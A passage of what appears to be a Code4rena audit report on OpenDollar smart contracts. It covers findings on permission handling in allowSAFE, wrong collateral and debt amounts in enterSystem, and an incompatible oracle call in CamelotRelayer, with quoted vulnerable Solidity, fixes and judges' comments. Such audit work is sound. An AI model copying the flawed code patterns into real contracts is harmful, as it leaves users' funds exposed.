class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">:   } </span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider implementing a separate modifier for the <code>allowSafe()</code> function that only checks if the msg.sender is the owner. If true, then allow execution but if not then revert.</p>\n<p>Solution:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlySafeOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">].</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">SafeNotAllowed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/171#issuecomment-1783564235\">pi0neerpat (OpenDollar) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Medium vulnerability recommended. Safe access is still limited, requiring user confirmation. The design could be improved, as described here, to remove the unexpected behavior of allowing additional approvals beyond the initial recipient.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/171#issuecomment-1790107095\">MiloTruck (Judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how incorrect use of the <code>safeAllowed()</code> modifier on the <code>allowSAFE()</code> function allows permissioned addresses that are not the safe owner to give permissions to other addresses, which is not intended.</p>\n<p>As this finding is contingent on the owner granting permissions to an address that becomes malicious, I believe medium severity is appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-13-odsafemanagerentersystem---transfer-wrong-amount-of-collateral-debt\" style=\"position:relative;\"><a href=\"#m-13-odsafemanagerentersystem---transfer-wrong-amount-of-collateral-debt\" aria-label=\"m 13 odsafemanagerentersystem   transfer wrong amount of collateral debt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/159\">[M-13] ODSafeManager.enterSystem - Transfer wrong amount of collateral, debt</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/159\">klau5</a></em></p>\n<p>If src has less lockedCollateral and generatedDebt than safeHandler, <code>enterSystem</code> cannot succeed.</p>\n<p>The <code>enterSystem</code> function is behaving differently than intended.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>ODSafeManager.enterSystem</code> function retrieves the amount of safeHandler’s <code>lockedCollateral</code> and <code>generatedDebt</code> and sends it to safeHandler. The purpose of this function is to send _src’s <code>lockedCollateral</code> and <code>generatedDebt</code> to safeHandler, so it is sending wrong amounts.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">enterSystem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_src</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">handlerAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_src</span><span class=\"mtk1\">) </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  </span><span class=\"mtk12\">ISAFEEngine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">SAFE</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lockedCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">generatedDebt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferSAFECollateralAndDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;    </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_src</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">EnterSystem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_src</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use <code>lockedCollateral</code> and <code>generatedDebt</code> of _src.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">function enterSystem(address _src, uint256 _safe) external handlerAllowed(_src) safeAllowed(_safe) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ ISAFEEngine.SAFE memory _safeInfo = ISAFEEngine(safeEngine).safes(_sData.collateralType, _src);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- ISAFEEngine.SAFE memory _safeInfo = ISAFEEngine(safeEngine).safes(_sData.collateralType, _sData.safeHandler);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  int256 _deltaCollateral = _safeInfo.lockedCollateral.toInt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  int256 _deltaDebt = _safeInfo.generatedDebt.toInt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ISAFEEngine(safeEngine).transferSAFECollateralAndDebt(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _sData.collateralType, _src, _sData.safeHandler, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  emit EnterSystem(msg.sender, _src, _safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/159#issuecomment-1791419211\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how <code>enterSystem()</code> calls <code>transferSAFECollateralAndDebt()</code> with collateral and debt amounts of the wrong safe handler, causing its functionality to be broken. As such, I agree with medium severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/159#issuecomment-1805212633\">pi0neerpat (OpenDollar) commented</a>:</strong></p>\n<blockquote>\n<p>This appears to be accurate, as the collateral and debt amounts are being recorded from the destination address instead of the source address.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-unable-to-retrieve-price-information-with-camelotrelayer-contract\" style=\"position:relative;\"><a href=\"#m-14-unable-to-retrieve-price-information-with-camelotrelayer-contract\" aria-label=\"m 14 unable to retrieve price information with camelotrelayer contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/156\">[M-14] Unable to retrieve price information with CamelotRelayer contract</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/156\">klau5</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/436\">nican0r</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/388\">Arz</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/316\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/244\">0x6d6164616e</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/181\">josephdara</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/173\">immeas</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/75\">T1MOH</a></em></p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L70\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L70</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L74\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L74</a> </p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L93\">https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/src/contracts/oracles/CamelotRelayer.sol#L93</a></p>\n<p>The price lookup feature of the CamelotRelayer contract does not work.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The CamelotRelayer contract uses Uniswap V3’s OracleLibrary to retrieve price information from Camelot pool. However, Camelot pool does not have the exact same interface as Uniswap V3, so the transaction will be reverted</p>\n<p>The <code>getResultWithValidity</code> function of the CamelotRelayer contract calls <code>OracleLibrary.getOldestObservationSecondsAgo</code> and <code>OracleLibrary.consult</code>. And <code>read</code> function of the CamelotRelayer contract calls <code>OracleLibrary.consult</code> .</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getResultWithValidity</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_result</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_validity</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// If the pool doesn&#39;t have enough history return false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getOldestObservationSecondsAgo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">camelotPair</span><span class=\"mtk1\">) &lt; </span><span class=\"mtk12\">quotePeriod</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Consult the query with a TWAP period of quotePeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  (</span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,) = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">consult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">camelotPair</span><span class=\"mtk1\">, </span><span class=\"mtk12\">quotePeriod</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Calculate the quote amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getQuoteAtTick</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tick:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">baseAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">baseToken:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">quoteToken:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Process the quote result to 18 decimal quote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_result</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_parseResult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_validity</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">read</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_result</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// This call may revert with &#39;OLD!&#39; if the pool doesn&#39;t have enough cardinality or initialized history</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  (</span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,) = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">consult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">camelotPair</span><span class=\"mtk1\">, </span><span class=\"mtk12\">quotePeriod</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_quoteAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getQuoteAtTick</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tick:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_arithmeticMeanTick</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">baseAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">baseToken:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">quoteToken:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_result</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_parseResult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_quoteAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>This is the OracleLibrary code from Uniswap V3. The <code>getOldestObservationSecondsAgo</code> function calls the pool contract’s <code>slot0</code> , <code>observations</code>. The <code>consult</code> function calls the <code>observe</code> function of pool contract.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getOldestObservationSecondsAgo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">secondsAgo</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  (, , </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">observationIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">observationCardinality</span><span class=\"mtk1\">, , , ) = </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">slot0</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">observationCardinality</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;NI&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">observationTimestamp</span><span class=\"mtk1\">, , , </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">) =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;      </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span 